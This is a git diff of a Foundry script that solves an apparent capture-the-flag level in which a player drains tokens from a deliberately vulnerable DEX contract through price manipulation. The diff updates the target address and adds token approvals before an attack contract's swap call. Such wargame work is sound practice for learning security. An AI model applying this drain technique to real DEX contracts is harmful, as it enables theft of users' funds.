@@ -4,8 +4,7 @@ pragma solidity ^0.8.0;
 import "forge-std/Script.sol";
 import "forge-std/console.sol";
 
-import "openzeppelin-contracts-06/contracts/token/ERC20/IERC20.sol";
-import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
+import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
 
 interface IDex {
     function token1() external view returns (address);
@@ -21,8 +20,6 @@ interface IDex {
     You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
 
     You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
-
-
 
     Quick note
     Normally, when you make a swap with an ERC20 token, you have to approve the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the approve method to the contract itself. So feel free to use contract.approve(contract.address, <uint amount>) instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the SwappableToken contract otherwise.
@@ -74,11 +71,15 @@ contract DexAttack {
 
 contract DexSolution is Script {
 
-    IDex dex = IDex(0x04D1DA1a890ba4B44DE682597Ceb96f43e45D153);
+    IDex dex = IDex(0xEE79A636703f4eb82b069Dd67Bf5c5eD918CbC5E);
+    IERC20 token1 = IERC20(dex.token1());
+    IERC20 token2 = IERC20(dex.token2());
 
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         DexAttack dexAttack = new DexAttack(dex);
+        token1.approve(address(dexAttack), 10);
+        token2.approve(address(dexAttack), 10);
         dexAttack.swap();
         vm.stopBroadcast();
     }
